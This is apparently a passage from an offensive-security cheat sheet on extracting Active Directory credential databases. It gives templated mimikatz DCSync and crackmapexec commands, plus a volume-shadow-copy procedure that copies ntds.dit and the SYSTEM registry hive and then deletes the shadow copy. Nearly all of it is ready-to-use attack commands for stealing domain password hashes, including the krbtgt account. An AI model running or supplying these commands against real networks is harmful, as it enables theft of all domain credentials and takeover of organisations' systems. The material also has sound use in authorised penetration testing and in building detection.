### DCSync (drsuapi)

```
mimikatz
lsadump::dcsync /domain:<DOMAIN_FQDN> /dc:<DC_FQDN> /user:<krbtgt | USERNAME>

crackmapexec <DC_HOSTNAME | DC_IP> -d "<DOMAIN>" -u '<USERNAME>' -p '<PASSWORD>' --ntds drsuapi
```

### Volume Shadow Copy

###### Local code execution

```
vssadmin create shadow /for=C:
# Shadow Copy ID: <GUID>
# Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\NTDS\ntds.dit <PATH>\ntds.dit
reg save HKLM\SYSTEM <PATH>\SYSTEM

vssadmin delete shadows /shadow=<GUID>
```

###### Over the network

```
crackmapexec <DC_HOSTNAME | DC_IP> -d "<DOMAIN>" -u '<USERNAME>' -p '<PASSWORD>' --ntds vss
```
